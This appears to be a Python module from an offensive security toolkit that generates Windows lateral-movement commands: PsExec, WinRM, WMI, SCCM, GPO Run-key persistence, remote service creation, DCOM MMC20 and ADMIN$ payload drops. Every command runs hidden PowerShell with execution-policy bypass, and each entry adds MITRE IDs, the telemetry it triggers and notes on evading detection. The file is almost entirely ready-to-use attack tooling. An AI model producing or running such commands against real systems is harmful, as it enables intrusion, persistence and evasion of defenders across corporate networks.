# language: Python 3.11+, file: cf/lateral.py
# *lateral movement — command builders with telemetry/opsec notes*
from __future__ import annotations

from .util import json_dumps

KINDS: dict[str, dict[str, str]] = {
    "pth": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Import-Module .\\Invoke-PsExec.ps1;"
            "Invoke-PsExec \\\\{host} -u {domain}\\{user} -p {password} "
            "-c '{payload}'\""
        ),
        "mitre": "T1550.002",
        "telemetry": "4624 type 3, 5140, 4648",
        "opsec": "pth needs ntlm relay or local admin on an intermediate host",
    },
    "winrm": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$s=New-PSSession -ComputerName {host} "
            "-Credential (New-Object PSCredential('{domain}\\{user}', "
            "(ConvertTo-SecureString '{password}' -AsPlainText -Force)));"
            "Invoke-Command -Session $s -ScriptBlock {{ {payload} }}\""
        ),
        "mitre": "T1021.006",
        "telemetry": "5985, 4624 type 3, 4103",
        "opsec": "winrm traffic is http — easy to spot on a monitored vlan",
    },
    "wmi": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Invoke-WmiMethod -Class Win32_Process -Name Create "
            "-ArgumentList '{payload}' -ComputerName {host} "
            "-Credential (Get-Credential)\""
        ),
        "mitre": "T1047",
        "telemetry": "4688, 5857, 5858, sysmon:1",
        "opsec": "leaves wmi operation logs on the remote host",
    },
    "sccm": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Invoke-CimMethod -ClassName SMS_Client "
            "-MethodName TriggerSchedule '{schedule_id}' -ComputerName {host}\""
        ),
        "mitre": "T1218",
        "telemetry": "smsprov.log, 4688, 4104",
        "opsec": "sccm abuse is high-signal — pivot only inside the change window",
    },
    "gpo": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Set-GPRegistryValue -Name '{gpo}' -Key "
            "'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
            "-ValueName '{value}' -Value '{payload}' -Type String\""
        ),
        "mitre": "T1484.001",
        "telemetry": "5136, sysmon:13",
        "opsec": "gpo push is loud and persistent — only with an explicit objective",
    },
    "service": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "sc.exe \\\\{host} create '{value}' binPath= '{payload}' start= demand;"
            "sc.exe \\\\{host} start '{value}'\""
        ),
        "mitre": "T1021",
        "telemetry": "7045 (remote), 5145 (ADMIN$ pipe), sysmon:1 on target",
        "opsec": "needs SYSTEM-local admin and an ADMIN$ share — svc create is heavily flagged",
    },
    "dcom": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$c=[activator]::CreateInstance([type]::GetTypeFromProgID("
            "'MMC20.Application','{host}'));"
            "$c.Document.ActiveView.ExecuteShellCommand("
            "'C:\\Windows\\System32\\cmd.exe',$null,'/c {payload}','7')\""
        ),
        "mitre": "T1021.003",
        "telemetry": "DCOM activation 135, 4688 on target, sysmon:1",
        "opsec": "no visible service on the wire — most times zero file io; watch 135/conn",
    },
    "shares": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "New-SmbMapping -RemotePath \\\\{host}\\ADMIN$ -Credential "
            "(New-Object PSCredential('{domain}\\{user}', "
            "(ConvertTo-SecureString '{password}' -AsPlainText -Force)));"
            "Copy-Item .\\sc.exe \\\\{host}\\ADMIN$\\sc_drop.exe;"
            "wmic /node:{host} process call create '\\sc_drop.exe {payload}'\""
        ),
        "mitre": "T1021.002",
        "telemetry": "5140/5145 with FILE WRITE on ADMIN$, 4688 remote",
        "opsec": "atypical admin$ write is a top pivot detection — drop with a native name",
    },
}


def command(kind: str, host: str, **values: str) -> dict[str, str]:
    """Same defaults the CLI pads in — a bare keyword render must not fail."""
    values.setdefault("user", "Administrator")
    values.setdefault("password", "Password123!")
    values.setdefault("domain", "CORP")
    values.setdefault("value", "Updater")
    values.setdefault("gpo", "Workstation Policy")
    values.setdefault("schedule_id", "{00000000-0000-0000-0000-000000000001}")
    spec = KINDS.get(kind)
    if spec is None:
        raise KeyError(f"unknown lateral kind: {kind}")
    out = spec["command"].format(host=host, **values)
    return {
        "kind": kind,
        "command": out,
        "mitre": spec["mitre"],
        "telemetry": spec["telemetry"],
        "opsec": spec["opsec"],
        "json": json_dumps({"kind": kind, "command": out}),
    }
